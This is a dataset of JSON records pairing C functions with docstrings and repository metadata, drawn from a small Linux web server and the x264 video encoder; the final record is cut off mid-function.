{"docstring": "/***************************************\n * Wrappers for memory mapping functions\n ***************************************/\n", "func_signal": "void *Mmap(void *addr, size_t len, int prot, int flags, int fd, off_t offset)", "code": "{\n    void *ptr;\n\n    if ((ptr = mmap(addr, len, prot, flags, fd, offset)) == ((void *) -1))\n    {\n        syslog(LOG_CRIT,\"Mmap error\");\n\tunix_error(\"mmap error\");\n    }\n    return(ptr);\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $begin post_dynamic */\n", "func_signal": "static void serve_dir(int fd,char *filename)", "code": "{\n\tDIR *dp;\n\tstruct dirent *dirp;\n    \tstruct stat sbuf;\n\tstruct passwd *filepasswd;\n\tint num=1;\n\tchar files[MAXLINE],buf[MAXLINE],name[MAXLINE],img[MAXLINE],modifyTime[MAXLINE],dir[MAXLINE];\n\tchar *p;\n\n\t/*\n\t* Start get the dir   \n\t* for example: /home/yihaibo/kerner/web/doc/dir -> dir[]=\"dir/\";\n\t*/\n\tp=strrchr(filename,'/');\n\t++p;\n\tstrcpy(dir,p);\n\tstrcat(dir,\"/\");\n\t/* End get the dir */\n\n\tif((dp=opendir(filename))==NULL)\n\t\tsyslog(LOG_ERR,\"cannot open dir:%s\",filename);\n\n    \tsprintf(files, \"<html><title>Dir Browser</title>\");\n\tsprintf(files,\"%s<style type=\"\"text/css\"\"> a:link{text-decoration:none;} </style>\",files);\n\tsprintf(files, \"%s<body bgcolor=\"\"ffffff\"\" font-family=Arial color=#fff font-size=14px>\\r\\n\", files);\n\n\twhile((dirp=readdir(dp))!=NULL)\n\t{\n\t\tif(strcmp(dirp->d_name,\".\")==0||strcmp(dirp->d_name,\"..\")==0)\n\t\t\tcontinue;\n\t\tsprintf(name,\"%s/%s\",filename,dirp->d_name);\n\t\tStat(name,&sbuf);\n\t\tfilepasswd=getpwuid(sbuf.st_uid);\n\n\t\tif(S_ISDIR(sbuf.st_mode))\n\t\t{\n\t\t\tsprintf(img,\"<img src=\"\"dir.png\"\" width=\"\"24px\"\" height=\"\"24px\"\">\");\n\t\t}\n\t\telse if(S_ISFIFO(sbuf.st_mode))\n\t\t{\n\t\t\tsprintf(img,\"<img src=\"\"fifo.png\"\" width=\"\"24px\"\" height=\"\"24px\"\">\");\n\t\t}\n\t\telse if(S_ISLNK(sbuf.st_mode))\n\t\t{\n\t\t\tsprintf(img,\"<img src=\"\"link.png\"\" width=\"\"24px\"\" height=\"\"24px\"\">\");\n\t\t}\n\t\telse if(S_ISSOCK(sbuf.st_mode))\n\t\t{\n\t\t\tsprintf(img,\"<img src=\"\"sock.png\"\" width=\"\"24px\"\" height=\"\"24px\"\">\");\n\t\t}\n\t\telse\n\t\t\tsprintf(img,\"<img src=\"\"file.png\"\" width=\"\"24px\"\" height=\"\"24px\"\">\");\n\n\n\t\tsprintf(files,\"%s<p><pre>%-2d %s \"\"<a href=%s%s\"\">%-15s</a>%-10s%10d %24s</pre></p>\\r\\n\",files,num++,img,dir,dirp->d_name,dirp->d_name,filepasswd->pw_name,(int)sbuf.st_size,timeModify(sbuf.st_mtime,modifyTime));\n\t}\n\tclosedir(dp);\n\tsprintf(files,\"%s</body></html>\",files);\n\n\t/* Send response headers to client */\n\tsprintf(buf, \"HTTP/1.0 200 OK\\r\\n\");\n\tsprintf(buf, \"%sServer: Tiny Web Server\\r\\n\", buf);\n\tsprintf(buf, \"%sContent-length: %d\\r\\n\", buf, strlen(files));\n\tsprintf(buf, \"%sContent-type: %s\\r\\n\\r\\n\", buf, \"text/html\");\n\n\t#ifdef HTTPS\n\tif(ishttps)\n\t{\n\t\tSSL_write(ssl,buf,strlen(buf));\n\t\tSSL_write(ssl,files,strlen(files));\n\t}\n\telse\n\t#endif\n\t{\n\t\tRio_writen(fd, buf, strlen(buf));\n\t\tRio_writen(fd, files, strlen(files));\n\t}\n\texit(0);\n\n}", "path": "main.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $end kill */\n", "func_signal": "unsigned int Sleep(unsigned int secs)", "code": "{\n    unsigned int rc;\n\n    if ((rc = sleep(secs)) < 0)\n    {\n        syslog(LOG_CRIT,\"Sleep error\");\n\tunix_error(\"Sleep error\");\n    }\n    return rc;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/*\n * serve_static - copy a file back to the client \n */\n/* $begin serve_static */\n", "func_signal": "static void serve_static(int fd, char *filename, int filesize)", "code": "{\n    int srcfd;\n    char *srcp, filetype[MAXLINE], buf[MAXBUF];\n \n    /* Send response headers to client */\n    get_filetype(filename, filetype);\n    sprintf(buf, \"HTTP/1.0 200 OK\\r\\n\");\n    sprintf(buf, \"%sServer: Tiny Web Server\\r\\n\", buf);\n    sprintf(buf, \"%sContent-length: %d\\r\\n\", buf, filesize);\n    sprintf(buf, \"%sContent-type: %s\\r\\n\\r\\n\", buf, filetype);\n\n    /* Send response body to client */\n    srcfd = Open(filename, O_RDONLY, 0);\n    srcp = Mmap(0, filesize, PROT_READ, MAP_PRIVATE, srcfd, 0);\n    Close(srcfd);\n\n    #ifdef HTTPS \n    if(ishttps)\n    {\n    \tSSL_write(ssl, buf, strlen(buf));\n\tSSL_write(ssl, srcp, filesize);\n    }\n    else\n    #endif\n    {\n\tRio_writen(fd, buf, strlen(buf));\n\tRio_writen(fd, srcp, filesize);\n    }\n    Munmap(srcp, filesize);\n}", "path": "main.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $begin wait */\n", "func_signal": "pid_t Wait(int *status)", "code": "{\n    pid_t pid;\n\n    if ((pid  = wait(status)) < 0)\n    {\n        syslog(LOG_CRIT,\"Wait error\");\n\tunix_error(\"Wait error\");\n    }\n    return pid;\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* $end forkwrapper */\n", "func_signal": "void Execve(const char *filename, char *const argv[], char *const envp[])", "code": "{\n    if (execve(filename, argv, envp) < 0)\n    {\n        syslog(LOG_CRIT,\"Execve  error\");\n\tunix_error(\"Execve error\");\n    }\n}", "path": "wrap.c", "repo_name": "Skycrab/Linux-C-Web-Server", "stars": 145, "license": "None", "language": "c", "size": 1292}
{"docstring": "/* Conversion between float and Q8.8 fixed point (big-endian) for storage */\n", "func_signal": "static void mbtree_fix8_pack( uint16_t *dst, float *src, int count )", "code": "{\n    for( int i = 0; i < count; i++ )\n        dst[i] = endian_fix16( (int16_t)(src[i] * 256.0f) );\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\mc.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* Functions for dealing with Unicode on Windows. */\n", "func_signal": "FILE *x264_fopen( const char *filename, const char *mode )", "code": "{\n    wchar_t filename_utf16[MAX_PATH];\n    wchar_t mode_utf16[16];\n    if( utf8_to_utf16( filename, filename_utf16 ) && utf8_to_utf16( mode, mode_utf16 ) )\n        return _wfopen( filename_utf16, mode_utf16 );\n    return NULL;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\osdep.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "// in: a pseudo-simd number of the form x+(y<<16)\n// return: abs(x)+(abs(y)<<16)\n", "func_signal": "static ALWAYS_INLINE sum2_t abs2( sum2_t a )", "code": "{\n    sum2_t s = ((a>>(BITS_PER_SUM-1))&(((sum2_t)1<<BITS_PER_SUM)+1))*((sum_t)-1);\n    return (a+s)^s;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\pixel.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "// !HIGH_BIT_DEPTH\n", "func_signal": "PROPAGATE_LIST(neon)\n\nvoid x264_mc_init_arm( int cpu, x264_mc_functions_t *pf )", "code": "{\n    if( !(cpu&X264_CPU_ARMV6) )\n        return;\n\n#if !HIGH_BIT_DEPTH\n    pf->prefetch_fenc_420 = x264_prefetch_fenc_arm;\n    pf->prefetch_fenc_422 = x264_prefetch_fenc_arm; /* FIXME */\n    pf->prefetch_ref  = x264_prefetch_ref_arm;\n#endif // !HIGH_BIT_DEPTH\n\n    if( !(cpu&X264_CPU_NEON) )\n        return;\n\n#if !HIGH_BIT_DEPTH\n    pf->copy_16x16_unaligned = x264_mc_copy_w16_neon;\n    pf->copy[PIXEL_16x16] = x264_mc_copy_w16_aligned_neon;\n    pf->copy[PIXEL_8x8]   = x264_mc_copy_w8_neon;\n    pf->copy[PIXEL_4x4]   = x264_mc_copy_w4_neon;\n\n    pf->plane_copy              = x264_plane_copy_neon;\n    pf->plane_copy_deinterleave = x264_plane_copy_deinterleave_neon;\n    pf->plane_copy_deinterleave_rgb = x264_plane_copy_deinterleave_rgb_neon;\n    pf->plane_copy_interleave = x264_plane_copy_interleave_neon;\n    pf->plane_copy_swap = x264_plane_copy_swap_neon;\n\n    pf->store_interleave_chroma = x264_store_interleave_chroma_neon;\n    pf->load_deinterleave_chroma_fdec = x264_load_deinterleave_chroma_fdec_neon;\n    pf->load_deinterleave_chroma_fenc = x264_load_deinterleave_chroma_fenc_neon;\n\n    pf->avg[PIXEL_16x16] = x264_pixel_avg_16x16_neon;\n    pf->avg[PIXEL_16x8]  = x264_pixel_avg_16x8_neon;\n    pf->avg[PIXEL_8x16]  = x264_pixel_avg_8x16_neon;\n    pf->avg[PIXEL_8x8]   = x264_pixel_avg_8x8_neon;\n    pf->avg[PIXEL_8x4]   = x264_pixel_avg_8x4_neon;\n    pf->avg[PIXEL_4x16]  = x264_pixel_avg_4x16_neon;\n    pf->avg[PIXEL_4x8]   = x264_pixel_avg_4x8_neon;\n    pf->avg[PIXEL_4x4]   = x264_pixel_avg_4x4_neon;\n    pf->avg[PIXEL_4x2]   = x264_pixel_avg_4x2_neon;\n\n    pf->weight    = x264_mc_wtab_neon;\n    pf->offsetadd = x264_mc_offsetadd_wtab_neon;\n    pf->offsetsub = x264_mc_offsetsub_wtab_neon;\n    pf->weight_cache = x264_weight_cache_neon;\n\n    pf->mc_chroma = x264_mc_chroma_neon;\n    pf->mc_luma = mc_luma_neon;\n    pf->get_ref = get_ref_neon;\n    pf->hpel_filter = hpel_filter_neon;\n    pf->frame_init_lowres_core = x264_frame_init_lowres_core_neon;\n\n    pf->integral_init4h = integral_init4h_neon;\n    pf->integral_init8h = integral_init8h_neon;\n    pf->integral_init4v = integral_init4v_neon;\n    pf->integral_init8v = integral_init8v_neon;\n\n    pf->mbtree_propagate_cost = x264_mbtree_propagate_cost_neon;\n    pf->mbtree_propagate_list = x264_mbtree_propagate_list_neon;\n    pf->mbtree_fix8_pack      = x264_mbtree_fix8_pack_neon;\n    pf->mbtree_fix8_unpack    = x264_mbtree_fix8_unpack_neon;\n#endif // !HIGH_BIT_DEPTH\n\n// Apple's gcc stupidly cannot align stack variables, and ALIGNED_ARRAY can't work on structs\n#ifndef SYS_MACOSX\n    pf->memcpy_aligned  = x264_memcpy_aligned_neon;\n#endif\n    pf->memzero_aligned = x264_memzero_aligned_neon;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\arm\\mc-c.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* This just improves encoder performance, it's not part of the spec */\n", "func_signal": "void x264_mb_predict_mv_ref16x16( x264_t *h, int i_list, int i_ref, int16_t mvc[9][2], int *i_mvc )", "code": "{\n    int16_t (*mvr)[2] = h->mb.mvr[i_list][i_ref];\n    int i = 0;\n\n#define SET_MVP(mvp) \\\n    { \\\n        CP32( mvc[i], mvp ); \\\n        i++; \\\n    }\n\n#define SET_IMVP(xy) \\\n    if( xy >= 0 ) \\\n    { \\\n        int shift = 1 + MB_INTERLACED - h->mb.field[xy]; \\\n        int16_t *mvp = h->mb.mvr[i_list][i_ref<<1>>shift][xy]; \\\n        mvc[i][0] = mvp[0]; \\\n        mvc[i][1] = mvp[1]<<1>>shift; \\\n        i++; \\\n    }\n\n    /* b_direct */\n    if( h->sh.i_type == SLICE_TYPE_B\n        && h->mb.cache.ref[i_list][x264_scan8[12]] == i_ref )\n    {\n        SET_MVP( h->mb.cache.mv[i_list][x264_scan8[12]] );\n    }\n\n    if( i_ref == 0 && h->frames.b_have_lowres )\n    {\n        int idx = i_list ? h->fref[1][0]->i_frame-h->fenc->i_frame-1\n                         : h->fenc->i_frame-h->fref[0][0]->i_frame-1;\n        if( idx <= h->param.i_bframe )\n        {\n            int16_t (*lowres_mv)[2] = h->fenc->lowres_mvs[i_list][idx];\n            if( lowres_mv[0][0] != 0x7fff )\n            {\n                M32( mvc[i] ) = (M32( lowres_mv[h->mb.i_mb_xy] )*2)&0xfffeffff;\n                i++;\n            }\n        }\n    }\n\n    /* spatial predictors */\n    if( SLICE_MBAFF )\n    {\n        SET_IMVP( h->mb.i_mb_left_xy[0] );\n        SET_IMVP( h->mb.i_mb_top_xy );\n        SET_IMVP( h->mb.i_mb_topleft_xy );\n        SET_IMVP( h->mb.i_mb_topright_xy );\n    }\n    else\n    {\n        SET_MVP( mvr[h->mb.i_mb_left_xy[0]] );\n        SET_MVP( mvr[h->mb.i_mb_top_xy] );\n        SET_MVP( mvr[h->mb.i_mb_topleft_xy] );\n        SET_MVP( mvr[h->mb.i_mb_topright_xy] );\n    }\n#undef SET_IMVP\n#undef SET_MVP\n\n    /* temporal predictors */\n    if( h->fref[0][0]->i_ref[0] > 0 )\n    {\n        x264_frame_t *l0 = h->fref[0][0];\n        int field = h->mb.i_mb_y&1;\n        int curpoc = h->fdec->i_poc + h->fdec->i_delta_poc[field];\n        int refpoc = h->fref[i_list][i_ref>>SLICE_MBAFF]->i_poc;\n        refpoc += l0->i_delta_poc[field^(i_ref&1)];\n\n#define SET_TMVP( dx, dy ) \\\n        { \\\n            int mb_index = h->mb.i_mb_xy + dx + dy*h->mb.i_mb_stride; \\\n            int scale = (curpoc - refpoc) * l0->inv_ref_poc[MB_INTERLACED&field]; \\\n            mvc[i][0] = (l0->mv16x16[mb_index][0]*scale + 128) >> 8; \\\n            mvc[i][1] = (l0->mv16x16[mb_index][1]*scale + 128) >> 8; \\\n            i++; \\\n        }\n\n        SET_TMVP(0,0);\n        if( h->mb.i_mb_x < h->mb.i_mb_width-1 )\n            SET_TMVP(1,0);\n        if( h->mb.i_mb_y < h->mb.i_mb_height-1 )\n            SET_TMVP(0,1);\n#undef SET_TMVP\n    }\n\n    *i_mvc = i;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\mvpred.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* handle the deprecated jpeg pixel formats */\n", "func_signal": "static int handle_jpeg( int csp, int *fullrange )", "code": "{\n    switch( csp )\n    {\n        case AV_PIX_FMT_YUVJ420P: *fullrange = 1; return AV_PIX_FMT_YUV420P;\n        case AV_PIX_FMT_YUVJ422P: *fullrange = 1; return AV_PIX_FMT_YUV422P;\n        case AV_PIX_FMT_YUVJ444P: *fullrange = 1; return AV_PIX_FMT_YUV444P;\n        default:                               return csp;\n    }\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\input\\ffms.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* Some external libraries doesn't support Unicode in filenames,\n * as a workaround we can try to get an ANSI filename instead. */\n", "func_signal": "int x264_ansi_filename( const char *filename, char *ansi_filename, int size, int create_file )", "code": "{\n    wchar_t filename_utf16[MAX_PATH];\n    if( utf8_to_utf16( filename, filename_utf16 ) )\n    {\n        if( create_file )\n        {\n            /* Create the file using the Unicode filename if it doesn't already exist. */\n            FILE *fh = _wfopen( filename_utf16, L\"ab\" );\n            if( fh )\n                fclose( fh );\n        }\n\n        /* Check if the filename already is valid ANSI. */\n        if( utf16_to_ansi( filename_utf16, ansi_filename, size ) )\n            return 1;\n\n        /* Check for a legacy 8.3 short filename. */\n        int short_length = GetShortPathNameW( filename_utf16, filename_utf16, MAX_PATH );\n        if( short_length > 0 && short_length < MAX_PATH )\n            if( utf16_to_ansi( filename_utf16, ansi_filename, size ) )\n                return 1;\n    }\n    return 0;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\x264.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/****************************************************************************\n * successive elimination\n ****************************************************************************/\n", "func_signal": "static int x264_pixel_ads4( int enc_dc[4], uint16_t *sums, int delta,\n                            uint16_t *cost_mvx, int16_t *mvs, int width, int thresh )", "code": "{\n    int nmv = 0;\n    for( int i = 0; i < width; i++, sums++ )\n    {\n        int ads = abs( enc_dc[0] - sums[0] )\n                + abs( enc_dc[1] - sums[8] )\n                + abs( enc_dc[2] - sums[delta] )\n                + abs( enc_dc[3] - sums[delta+8] )\n                + cost_mvx[i];\n        if( ads < thresh )\n            mvs[nmv++] = i;\n    }\n    return nmv;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\pixel.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* full chroma mc (ie until 1/8 pixel)*/\n", "func_signal": "static void mc_chroma( pixel *dstu, pixel *dstv, intptr_t i_dst_stride,\n                       pixel *src, intptr_t i_src_stride,\n                       int mvx, int mvy,\n                       int i_width, int i_height )", "code": "{\n    pixel *srcp;\n\n    int d8x = mvx&0x07;\n    int d8y = mvy&0x07;\n    int cA = (8-d8x)*(8-d8y);\n    int cB = d8x    *(8-d8y);\n    int cC = (8-d8x)*d8y;\n    int cD = d8x    *d8y;\n\n    src += (mvy >> 3) * i_src_stride + (mvx >> 3)*2;\n    srcp = &src[i_src_stride];\n\n    for( int y = 0; y < i_height; y++ )\n    {\n        for( int x = 0; x < i_width; x++ )\n        {\n            dstu[x] = ( cA*src[2*x]  + cB*src[2*x+2] +\n                        cC*srcp[2*x] + cD*srcp[2*x+2] + 32 ) >> 6;\n            dstv[x] = ( cA*src[2*x+1]  + cB*src[2*x+3] +\n                        cC*srcp[2*x+1] + cD*srcp[2*x+3] + 32 ) >> 6;\n        }\n        dstu += i_dst_stride;\n        dstv += i_dst_stride;\n        src   = srcp;\n        srcp += i_src_stride;\n    }\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\mc.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "// FIXME this wrapper has a significant cpu cost\n", "func_signal": "static void x264_deblock_v_luma_mmx2( uint8_t *pix, intptr_t stride, int alpha, int beta, int8_t *tc0 )", "code": "{\n    x264_deblock_v8_luma_mmx2( pix,   stride, alpha, beta, tc0   );\n    x264_deblock_v8_luma_mmx2( pix+8, stride, alpha, beta, tc0+2 );\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\deblock.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* From ffmpeg */\n", "func_signal": "static ALWAYS_INLINE void deblock_edge_luma_c( pixel *pix, intptr_t xstride, int alpha, int beta, int8_t tc0 )", "code": "{\n    int p2 = pix[-3*xstride];\n    int p1 = pix[-2*xstride];\n    int p0 = pix[-1*xstride];\n    int q0 = pix[ 0*xstride];\n    int q1 = pix[ 1*xstride];\n    int q2 = pix[ 2*xstride];\n\n    if( abs( p0 - q0 ) < alpha && abs( p1 - p0 ) < beta && abs( q1 - q0 ) < beta )\n    {\n        int tc = tc0;\n        int delta;\n        if( abs( p2 - p0 ) < beta )\n        {\n            if( tc0 )\n                pix[-2*xstride] = p1 + x264_clip3( (( p2 + ((p0 + q0 + 1) >> 1)) >> 1) - p1, -tc0, tc0 );\n            tc++;\n        }\n        if( abs( q2 - q0 ) < beta )\n        {\n            if( tc0 )\n                pix[ 1*xstride] = q1 + x264_clip3( (( q2 + ((p0 + q0 + 1) >> 1)) >> 1) - q1, -tc0, tc0 );\n            tc++;\n        }\n\n        delta = x264_clip3( (((q0 - p0 ) << 2) + (p1 - q1) + 4) >> 3, -tc, tc );\n        pix[-1*xstride] = x264_clip_pixel( p0 + delta );    /* p0' */\n        pix[ 0*xstride] = x264_clip_pixel( q0 - delta );    /* q0' */\n    }\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\deblock.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "// out: o = |x-y| < a\n", "func_signal": "static inline vec_u8_t diff_lt_altivec( register vec_u8_t x, register vec_u8_t y, register vec_u8_t a )", "code": "{\n    register vec_u8_t diff = vec_subs(x, y);\n    register vec_u8_t diffneg = vec_subs(y, x);\n    register vec_u8_t o = vec_or(diff, diffneg); /* |x-y| */\n    o = (vec_u8_t)vec_cmplt(o, a);\n    return o;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\ppc\\deblock.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* generate a filter sequence to try based on the filename extension */\n", "func_signal": "static void avs_build_filter_sequence( char *filename_ext, const char *filter[AVS_MAX_SEQUENCE+1] )", "code": "{\n    int i = 0;\n#if USE_AVXSYNTH\n    const char *all_purpose[] = { \"FFVideoSource\", 0 };\n#else\n    const char *all_purpose[] = { \"FFmpegSource2\", \"DSS2\", \"DirectShowSource\", 0 };\n    if( !strcasecmp( filename_ext, \"avi\" ) )\n        filter[i++] = \"AVISource\";\n    if( !strcasecmp( filename_ext, \"d2v\" ) )\n        filter[i++] = \"MPEG2Source\";\n    if( !strcasecmp( filename_ext, \"dga\" ) )\n        filter[i++] = \"AVCSource\";\n#endif\n    for( int j = 0; all_purpose[j] && i < AVS_MAX_SEQUENCE; j++ )\n        filter[i++] = all_purpose[j];\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\input\\avs.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/****************************************************************************\n * pixel_satd_WxH: sum of 4x4 Hadamard transformed differences\n ****************************************************************************/\n", "func_signal": "static NOINLINE int x264_pixel_satd_4x4( pixel *pix1, intptr_t i_pix1, pixel *pix2, intptr_t i_pix2 )", "code": "{\n    sum2_t tmp[4][2];\n    sum2_t a0, a1, a2, a3, b0, b1;\n    sum2_t sum = 0;\n    for( int i = 0; i < 4; i++, pix1 += i_pix1, pix2 += i_pix2 )\n    {\n        a0 = pix1[0] - pix2[0];\n        a1 = pix1[1] - pix2[1];\n        b0 = (a0+a1) + ((a0-a1)<<BITS_PER_SUM);\n        a2 = pix1[2] - pix2[2];\n        a3 = pix1[3] - pix2[3];\n        b1 = (a2+a3) + ((a2-a3)<<BITS_PER_SUM);\n        tmp[i][0] = b0 + b1;\n        tmp[i][1] = b0 - b1;\n    }\n    for( int i = 0; i < 2; i++ )\n    {\n        HADAMARD4( a0, a1, a2, a3, tmp[0][i], tmp[1][i], tmp[2][i], tmp[3][i] );\n        a0 = abs2(a0) + abs2(a1) + abs2(a2) + abs2(a3);\n        sum += ((sum_t)a0) + (a0>>BITS_PER_SUM);\n    }\n    return sum >> 1;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\pixel.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* load the library and functions we require from it */\n", "func_signal": "static int x264_avs_load_library( avs_hnd_t *h )", "code": "{\n    h->library = avs_open();\n    if( !h->library )\n        return -1;\n    LOAD_AVS_FUNC( avs_clip_get_error, 0 );\n    LOAD_AVS_FUNC( avs_create_script_environment, 0 );\n    LOAD_AVS_FUNC( avs_delete_script_environment, 1 );\n    LOAD_AVS_FUNC( avs_get_error, 1 );\n    LOAD_AVS_FUNC( avs_get_frame, 0 );\n    LOAD_AVS_FUNC( avs_get_video_info, 0 );\n    LOAD_AVS_FUNC( avs_function_exists, 0 );\n    LOAD_AVS_FUNC( avs_invoke, 0 );\n    LOAD_AVS_FUNC( avs_release_clip, 0 );\n    LOAD_AVS_FUNC( avs_release_value, 0 );\n    LOAD_AVS_FUNC( avs_release_video_frame, 0 );\n    LOAD_AVS_FUNC( avs_take_clip, 0 );\n#if !USE_AVXSYNTH\n    // AviSynth+ extension\n    LOAD_AVS_FUNC( avs_is_rgb48, 1 );\n    LOAD_AVS_FUNC_ALIAS( avs_is_rgb48, \"_avs_is_rgb48@4\", 1 );\n    LOAD_AVS_FUNC( avs_is_rgb64, 1 );\n    LOAD_AVS_FUNC_ALIAS( avs_is_rgb64, \"_avs_is_rgb64@4\", 1 );\n    LOAD_AVS_FUNC( avs_is_yuv444p16, 1 );\n    LOAD_AVS_FUNC( avs_is_yuv422p16, 1 );\n    LOAD_AVS_FUNC( avs_is_yuv420p16, 1 );\n    LOAD_AVS_FUNC( avs_is_y16, 1 );\n    LOAD_AVS_FUNC( avs_is_yuv444ps, 1 );\n    LOAD_AVS_FUNC( avs_is_yuv422ps, 1 );\n    LOAD_AVS_FUNC( avs_is_yuv420ps, 1 );\n    LOAD_AVS_FUNC( avs_is_y32, 1 );\n    LOAD_AVS_FUNC( avs_is_444, 1 );\n    LOAD_AVS_FUNC( avs_is_422, 1 );\n    LOAD_AVS_FUNC( avs_is_420, 1 );\n    LOAD_AVS_FUNC( avs_is_y, 1 );\n    LOAD_AVS_FUNC( avs_is_yuva, 1 );\n    LOAD_AVS_FUNC( avs_is_planar_rgb, 1 );\n    LOAD_AVS_FUNC( avs_is_planar_rgba, 1 );\n    LOAD_AVS_FUNC( avs_num_components, 1 );\n    LOAD_AVS_FUNC( avs_component_size, 1 );\n    LOAD_AVS_FUNC( avs_bits_per_component, 1 );\n#endif\n    return 0;\nfail:\n    avs_close( h->library );\n    h->library = NULL;\n    return -1;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\input\\avs.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* MSVC pre-VS2015 has broken snprintf/vsnprintf implementations which are incompatible with C99. */\n", "func_signal": "int x264_snprintf( char *s, size_t n, const char *fmt, ... )", "code": "{\n    va_list arg;\n    va_start( arg, fmt );\n    int length = x264_vsnprintf( s, n, fmt, arg );\n    va_end( arg );\n    return length;\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\osdep.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/****************************************************************************\n * structural similarity metric\n ****************************************************************************/\n", "func_signal": "static void ssim_4x4x2_core( const pixel *pix1, intptr_t stride1,\n                             const pixel *pix2, intptr_t stride2,\n                             int sums[2][4] )", "code": "{\n    for( int z = 0; z < 2; z++ )\n    {\n        uint32_t s1 = 0, s2 = 0, ss = 0, s12 = 0;\n        for( int y = 0; y < 4; y++ )\n            for( int x = 0; x < 4; x++ )\n            {\n                int a = pix1[x+y*stride1];\n                int b = pix2[x+y*stride2];\n                s1  += a;\n                s2  += b;\n                ss  += a*a;\n                ss  += b*b;\n                s12 += a*b;\n            }\n        sums[z][0] = s1;\n        sums[z][1] = s2;\n        sums[z][2] = ss;\n        sums[z][3] = s12;\n        pix1 += 4;\n        pix2 += 4;\n    }\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\pixel.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* Implicit weighted bipred only:\n * assumes log2_denom = 5, offset = 0, weight1 + weight2 = 64 */\n", "func_signal": "static inline void pixel_avg_weight_wxh( pixel *dst,  intptr_t i_dst,\n                                         pixel *src1, intptr_t i_src1,\n                                         pixel *src2, intptr_t i_src2, int width, int height, int i_weight1 )", "code": "{\n    int i_weight2 = 64 - i_weight1;\n    for( int y = 0; y<height; y++, dst += i_dst, src1 += i_src1, src2 += i_src2 )\n        for( int x = 0; x<width; x++ )\n            dst[x] = x264_clip_pixel( (src1[x]*i_weight1 + src2[x]*i_weight2 + (1<<5)) >> 6 );\n}", "path": "library\\src\\main\\libenc\\jni\\libx264\\common\\mc.c", "repo_name": "SiKang123/LiveTest", "stars": 209, "license": "None", "language": "c", "size": 36458}
{"docstring": "/* For deblock-aware RD.\n * TODO:\n *  deblock macroblock edges\n *  support analysis partitions smaller than 16x16\n *  deblock chroma for 4:2:0/4:2:2\n *  handle duplicate refs correctly\n */\n", "func_signal": "void x264_macroblock_deblock( x264_t *h )", "code": "{\n    int a = h->sh.i_alpha_c0_offset - QP_BD_OFFSET;\n    int b = h->sh.i_beta_offset - QP_BD_OFFSET;\n    int qp_thresh = 15 - X264_MIN( a, b ) - X264_MAX( 0, h->pps->i_chroma_qp_index_offset );\n    int intra_cur = IS_INTRA( h->mb.i_type );\n    int qp = h->mb.i_qp;\n    int qpc = h->mb.i_chroma_qp;\n    if( (h->mb.i_partition == D_16x16 && !h->mb.i_cbp_luma && !intra_cur) || qp <= qp_thresh )\n        return;\n\n    uint8_t (*bs)[8][4] = h->mb.cache.deblock_strength;\n    if( intra_cur )\n    {\n        M32( bs[0][1] ) = 0x03030303;\n        M64( bs[0][2] ) = 0x0303030303030303ULL;\n        M32( bs[1][1] ) = 0x03030303;\n        M64( bs[1][2] ) = 0x0303030303030303ULL;\n    }\n    else\n        h->loopf.deblock_strength( h->mb.cache.non_zero_count, h->mb.cache.ref, h->mb.cache.mv,\n                                   bs, 4 >> MB_INTERLACED, h->sh.i_type == SLICE_TYPE_B 